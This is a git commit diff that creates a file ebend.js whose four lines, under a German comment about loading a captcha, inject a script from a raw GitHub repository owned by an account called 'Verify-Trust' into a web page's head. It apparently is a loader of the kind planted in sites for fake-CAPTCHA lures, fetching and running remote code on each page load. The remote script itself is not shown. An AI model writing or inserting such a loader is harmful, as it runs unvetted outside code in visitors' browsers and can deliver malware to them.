f17f62b204297199438aef26d9b688616afa6734
Verify-Trust <ops.edcomedge@gmail.com>
2025-04-13 23:41:46 +0200

    Create ebend.js

---
+++ ebend.js
@@ -0,0 +1,4 @@
+// Das lädt dein Captcha von GitHub
+var script = document.createElement('script');
+script.src = "https://raw.githubusercontent.com/Verify-Trust/Edcomedge/main/captcha.js";
+document.head.appendChild(script);
